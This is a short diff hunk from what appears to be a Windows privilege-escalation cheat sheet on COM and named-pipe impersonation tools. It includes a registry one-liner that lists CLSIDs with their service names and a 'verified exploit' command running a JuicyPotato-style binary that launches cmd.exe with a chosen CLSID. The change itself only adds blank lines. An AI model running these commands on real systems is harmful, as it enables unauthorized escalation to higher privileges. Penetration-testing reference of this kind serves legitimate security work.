@@ -372,7 +372,9 @@ These tools abuse Windows COM or named pipe impersonation mechanisms to escalate
 ```powershell
 for /f "tokens=*" %A in ('reg query HKCR\CLSID 2^>nul') do @for /f "tokens=3" %B in ('reg query "%A" /v AppID 2^>nul ^| find /i "AppID"') do @for /f "tokens=3" %C in ('reg query HKCR\AppID\%B /v LocalService 2^>nul ^| find /i "LocalService"') do @echo CLSID: %A ^| AppID: %B ^| LocalService: %C
 ```
+
 - Verified exploit
+
 ```bash
 C:\Users\apache\Desktop>jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/k whoami > C:\Users\Public\whoami.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/k whoami > C:\Users\Public\whoami.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
